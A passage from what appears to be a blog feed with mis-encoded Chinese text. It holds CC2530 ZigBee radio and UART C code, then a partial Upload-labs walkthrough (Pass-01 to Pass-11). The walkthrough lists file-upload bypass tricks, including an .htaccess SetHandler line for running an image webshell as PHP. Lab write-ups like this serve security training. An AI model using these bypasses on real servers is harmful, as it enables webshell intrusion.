class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 ç­‰å¾…32Mç¨³å®š</span>   <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 ä¸åˆ†é¢‘è¾“å‡º</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 è®¾ç½®32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿ</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 ç­‰å¾…32MæˆåŠŸæˆä¸ºå½“å‰ç³»ç»Ÿä¸»æ—¶é’Ÿ</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">KeysIntCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è®¾ç½®å¼€å…³ä¸­æ–­</span><span class="token punctuation">&#123;</span><span class="token comment">//Key3  Key4   Key5</span>          IEN2<span class="token operator">|=</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token comment">//å¼€P1IEç»„ä¸­æ–­</span>     P1IEN<span class="token operator">|=</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//å¼€Key3ç»„å†…ä¸­æ–­</span>     PICTL<span class="token operator">|=</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®P1_1ä¸ºä¸‹é™æ²¿ </span>     EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">//å¼€æ€»ä¸­æ–­</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//æ— çº¿é€šä¿¡çš„åˆå§‹åŒ–  åˆå§‹åŒ–ç›¸å…³çš„å¯„å­˜å™¨ï¼Œé…ç½®å·¥ä½œä¿¡é“ï¼Œå’ŒPANID</span><span class="token punctuation">&#123;</span>    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    FRMCTRL0 <span class="token operator">|=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>    <span class="token comment">// Recommended RX settings  </span>    TXFILTCFG <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>    AGCCTRL1 <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>    FSCAL1 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>        <span class="token comment">// enable RXPKTDONE interrupt  </span>    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span><span class="token comment">//æŠŠå°„é¢‘æ¥æ”¶ä¸­æ–­æ‰“å¼€</span>    <span class="token comment">// enable general RF interrupts</span>    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>        FREQCTRL <span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);   </span>                     <span class="token comment">//è®¾ç½®è½½æ³¢ä¸º2475M</span>    PAN_ID0<span class="token operator">=</span><span class="token number">0x07</span><span class="token punctuation">;</span>    PAN_ID1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span> <span class="token comment">//0x2007   </span><span class="token comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span>    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//æ¸…æ¥æ”¶ç¼“å†²å™¨</span>    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//å¼€å¯æ¥æ”¶ä½¿èƒ½ </span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">RFSend</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>pstr<span class="token punctuation">,</span><span class="token keyword">char</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> i<span class="token punctuation">;</span>    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span> <span class="token comment">//ç¡®ä¿æ¥æ”¶æ˜¯ç©ºçš„</span>    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span> <span class="token comment">//æ¸…æ¥æ”¶æ ‡å¿—ä½</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>FSMSTAT1 <span class="token operator">&amp;</span> <span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç­‰å¾…å°„é¢‘å‘é€å‡†å¤‡å¥½</span>    RFST <span class="token operator">=</span> <span class="token number">0xEE</span><span class="token punctuation">;</span><span class="token comment">//ç¡®ä¿å‘é€é˜Ÿåˆ—æ˜¯ç©º</span>    RFIRQF1 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//æ¸…å‘é€æ ‡å¿—ä½</span><span class="token comment">//ä¸ºæ•°æ®å‘é€åšå¥½å‡†å¤‡å·¥ä½œ</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>       RFD<span class="token operator">=</span>pstr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token comment">//å¾ªç¯çš„ä½œç”¨æ˜¯æŠŠæˆ‘ä»¬è¦å‘é€çš„æ•°æ®å…¨éƒ¨å‹åˆ°å‘é€ç¼“å†²åŒºé‡Œé¢</span>        RFST <span class="token operator">=</span> <span class="token number">0xE9</span><span class="token punctuation">;</span> <span class="token comment">//è¿™ä¸ªå¯„å­˜å™¨ä¸€æ—¦è¢«è®¾ç½®ä¸º0xE9,å‘é€ç¼“å†²åŒºçš„æ•°æ®å°±è¢«å‘é€å‡ºå»</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>RFIRQF1 <span class="token operator">&amp;</span> <span class="token number">0x02</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç­‰å¾…å‘é€å®Œæˆ</span>    RFIRQF1 <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//æ¸…å‘é€å®Œæˆæ ‡å¿—</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//74LS164æ§åˆ¶æ•°ç ç®¡çš„åˆå§‹åŒ–</span>   <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¸»æ—¶é’Ÿæ™¶æŒ¯å·¥ä½œåœ¨32M </span>   <span class="token function">KeysIntCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ— çº¿é€šä¿¡çš„åˆå§‹åŒ–  åˆå§‹åŒ–ç›¸å…³çš„å¯„å­˜å™¨ï¼Œé…ç½®å·¥ä½œä¿¡é“ï¼Œå’ŒPANID</span>     SHORT_ADDR0<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">;</span>  SHORT_ADDR1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®æœ¬æ¨¡å—åœ°å€  è®¾ç½®æœ¬æ¨¡å—çš„ç½‘ç»œåœ°å€0x2050</span>  <span class="token comment">//å¤§å°ç«¯æ¨¡å¼é—®é¢˜ï¼Œ</span>      <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>P1INT_VECTOR</span></span>__interrupt <span class="token keyword">void</span> <span class="token function">Key3_ISR</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//P1_1</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0x02</span> <span class="token operator">&amp;</span> P1IFG<span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>P1_1<span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>           P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span>           P1_0 <span class="token operator">^=</span><span class="token number">1</span><span class="token punctuation">;</span>           <span class="token function">RFSend</span><span class="token punctuation">(</span>SendPacket<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>     P1IFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     P1IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>RF_VECTOR</span></span>__interrupt <span class="token keyword">void</span> <span class="token function">RF_IRQ</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//è¿™ä¸ªæ˜¯å°„é¢‘ä¸­æ–­å‡½æ•°ï¼Œå½“å°ç¯æ¨¡å—æ¥æ”¶åˆ°å¼€å…³æ¨¡å—å‘é€æ¥çš„æ•°æ®æ—¶ï¼Œå°ç¯æ¨¡å—çš„CPUå°±ä¼šè¿›å…¥ä¸­æ–­å‡½æ•°æ‰§è¡Œ</span>    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> RFIRQF0 <span class="token operator">&amp;</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                    RFIRQF0<span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>   <span class="token comment">// Clear RXPKTDONE interrupt</span>    <span class="token punctuation">&#125;</span>    S1CON<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// Clear general RF interrupt flag</span>    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//æ¸…æ¥æ”¶ç¼“å†²å™¨</span>    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//å¼€å¯æ¥æ”¶ä½¿èƒ½ </span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¥æ”¶ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span><span class="token keyword">void</span> <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> y<span class="token punctuation">,</span>x<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>y<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>y<span class="token operator">--</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>x<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 å¼€å¯2ä¸ªé«˜é¢‘æ—¶é’Ÿæº</span>   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 ç­‰å¾…32Mç¨³å®š</span>   <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 ä¸åˆ†é¢‘è¾“å‡º</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 è®¾ç½®32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿ</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 ç­‰å¾…32MæˆåŠŸæˆä¸ºå½“å‰ç³»ç»Ÿä¸»æ—¶é’Ÿ</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Uart0_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//æŠŠè¿™ä¸ªå¯„å­˜å™¨çš„ç¬¬é›¶ä½å¼ºè¡Œæ¸…é›¶  1111 1110 </span>   <span class="token comment">//å°±æ˜¯æŠŠä¸²å£0çš„è„šä½ç½®é…ç½®åœ¨å¤‡ç”¨ä½ç½®1 å³P0_2  P0_3</span>      P0SEL  <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//è®©P0_2  P0_3è¿™ä¸¤ä¸ªè„šå·¥ä½œåœ¨ç‰‡ä¸Šå¤–è®¾æ¨¡å¼,è€Œä¸æ˜¯æ™®é€šIOå£       0000 1100</span>      U0CSR <span class="token operator">|=</span><span class="token number">0xC0</span><span class="token punctuation">;</span>   U0UCR <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//ä¸²å£0 å…¸å‹çš„ä¸²å£é…ç½®  æ ¡éªŒä½ åœæ­¢ä½ä¹‹ç±»çš„ä¸œè¥¿</span>      U0GCR <span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>   U0BAUD <span class="token operator">=</span><span class="token number">216</span><span class="token punctuation">;</span><span class="token comment">//å°±æ˜¯é‡å®˜æ–¹æ•°æ®æ‰‹å†Œä¸­æ³¢ç‰¹ç‡è¡¨æ ¼ä¸­å‚ç…§115200æ—¶çš„ é…ç½®å€¼ï¼Œå‰ææ˜¯ç³»ç»Ÿæ—¶é’Ÿåœ¨32M</span>      IEN0 <span class="token operator">|=</span><span class="token number">0x04</span><span class="token punctuation">;</span> <span class="token comment">//å¼€æ¥æ”¶æ•°æ®çš„ä¸­æ–­  0000 0100</span>   EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Uart0SendByte</span><span class="token punctuation">(</span><span class="token keyword">char</span> SendByte<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    U0DBUF<span class="token operator">=</span>SendByte<span class="token punctuation">;</span>  <span class="token comment">//æŠŠæˆ‘ä»¬æ”¶åˆ°çš„æ•°æ®é€šè¿‡ä¸²å£å†è¿”å›å‘å‡ºå»</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>UTX0IF<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    UTX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    FRMCTRL0 <span class="token operator">|=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>    <span class="token comment">// Recommended RX settings  </span>    TXFILTCFG <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>    AGCCTRL1 <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>    FSCAL1 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>    <span class="token comment">// enable RXPKTDONE interrupt  </span>    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>    <span class="token comment">// enable general RF interrupts</span>    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>        FREQCTRL <span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);    </span>    PAN_ID0<span class="token operator">=</span><span class="token number">0x07</span><span class="token punctuation">;</span>    PAN_ID1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span>    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//æ¸…æ¥æ”¶ç¼“å†²å™¨</span>    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//å¼€å¯æ¥æ”¶ä½¿èƒ½ </span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//74LS164æ§åˆ¶æ•°ç ç®¡çš„åˆå§‹åŒ–</span>   <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¸»æ—¶é’Ÿæ™¶æŒ¯å·¥ä½œåœ¨32M </span>   <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">Uart0_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     SHORT_ADDR0<span class="token operator">=</span><span class="token number">0xEF</span><span class="token punctuation">;</span>  SHORT_ADDR1<span class="token operator">=</span><span class="token number">0xBE</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®æœ¬æ¨¡å—åœ°å€  0xBEEF</span>      <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">RevRFProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">static</span> <span class="token keyword">char</span> len<span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">char</span>  ch<span class="token punctuation">;</span>    len<span class="token operator">=</span>ch<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    RFIRQM0 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>    IEN2 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x01</span><span class="token punctuation">;</span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>     len<span class="token operator">=</span>RFD<span class="token punctuation">;</span><span class="token comment">//è¯»ç¬¬ä¸€ä¸ªå­—èŠ‚åˆ¤æ–­è¿™ä¸€ä¸²æ•°æ®åé¢æœ‰å‡ ä¸ªå­—èŠ‚ï¼›</span>    <span class="token comment">//len=0x0C 12</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span><span class="token comment">//åªè¦åé¢è¿˜æœ‰æ•°æ®é‚£ä¹ˆå°±æŠŠä»–éƒ½ä»æ¥å—ç¼“å†²åŒºå–å‡ºæ¥</span>        ch<span class="token operator">=</span>RFD<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">==</span>len<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœå€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚ç­‰äº7ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠLED0å–å</span>           <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                len<span class="token operator">--</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>         EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// enable RXPKTDONE interrupt</span>    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>    <span class="token comment">// enable general RF interrupts</span>    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>RF_VECTOR</span></span>__interrupt <span class="token keyword">void</span> <span class="token function">RF_IRQ</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//è¿™ä¸ªæ˜¯å°„é¢‘ä¸­æ–­å‡½æ•°ï¼Œå½“å°ç¯æ¨¡å—æ¥æ”¶åˆ°å¼€å…³æ¨¡å—å‘é€æ¥çš„æ•°æ®æ—¶ï¼Œå°ç¯æ¨¡å—çš„CPUå°±ä¼šè¿›å…¥ä¸­æ–­å‡½æ•°æ‰§è¡Œ</span>    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> RFIRQF0 <span class="token operator">&amp;</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token function">RevRFProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     RFIRQF0<span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>   <span class="token comment">// Clear RXPKTDONE interrupt</span>    <span class="token punctuation">&#125;</span>    S1CON<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                   <span class="token comment">// Clear general RF interrupt flag</span>    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//æ¸…æ¥æ”¶ç¼“å†²å™¨</span>    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//å¼€å¯æ¥æ”¶ä½¿èƒ½ </span>    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labsé¶åœº</title>
      <link href="posts/76ab3a0e/"/>
      <url>posts/76ab3a0e/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>å‰ç«¯éªŒè¯ï¼Œå®¡æŸ¥å…ƒç´ åˆ é™¤HTMLä¸­çš„onsubmitå±æ€§å†ä¸Šä¼ å³å¯</p><span id="more"></span><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>MIMEéªŒè¯æŠ“åŒ…ä¿®æ”¹ <code>Content-Type</code> ä¸º <code>image/jpeg</code> åForwardå³å¯</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>é»‘åå•ç»•è¿‡ï¼Œä¸Šä¼ <code>.phtml</code>åç¼€å³å¯</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>é»‘åå•è¿‡æ»¤äº†å¤§å¤šæ•°åç¼€ï¼Œäºæ˜¯ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå†ä¸Šä¼ åç¼€ä¸º<code>.jpg</code>çš„å›¾ç‰‡é©¬å³å¯</p><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php</code></pre><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>é»‘åå•è¿‡æ»¤çš„ç»å¤§å¤šæ•°åç¼€åï¼Œå¹¶æœªè¿›è¡Œå¤§å°å†™è½¬æ¢ï¼Œäºæ˜¯ä¸Šä¼ <code>.Php</code>åç¼€å³å¯</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>é»‘åå•ç»•è¿‡ï¼ŒæŠ“åŒ…åœ¨åç¼€åæœ€ååŠ ä¸Šä¸€ä¸ªç©ºæ ¼å³å¯ä¸Šä¼ ç»•è¿‡</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>æ²¡è¿›è¡Œåˆ é™¤æœ«å°¾çš„ç‚¹çš„å‡½æ•°ï¼ŒæŠ“åŒ…åœ¨åç¼€åååŠ ä¸Šä¸€ä¸ªç‚¹å³å¯</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>æœªè¿‡æ»¤<code>::$DATA</code>ï¼Œåˆ©ç”¨Windowsè§£æç‰¹æ€§ï¼ŒæŠ“åŒ…åœ¨åç¼€ååé¢æ·»åŠ ä¸Š<code>::$DATA</code>å³å¯ç»•è¿‡</p><blockquote><p>phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å</p></blockquote><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>æ­¤å¤„æ–‡ä»¶è·¯å¾„æ‹¼æ¥çš„æ˜¯å¤„ç†åçš„æ–‡ä»¶åï¼Œäºæ˜¯ä¸Šä¼ åç¼€ä¸º<code>php. .</code>çš„æ–‡ä»¶å³å¯</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>å‡½æ•°å°†é»‘åå•å†…çš„åç¼€åæ›¿æ¢æˆç©ºï¼Œè¿™é‡ŒåŒå†™åç¼€å<code>.pphphp</code>å³å¯</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>ç™½åå•éªŒè¯ï¼Œæç¤ºä¸Šä¼ è·¯å¾„å¯æ§ï¼Œå‘ç°åœ¨ä¸Šä¼ 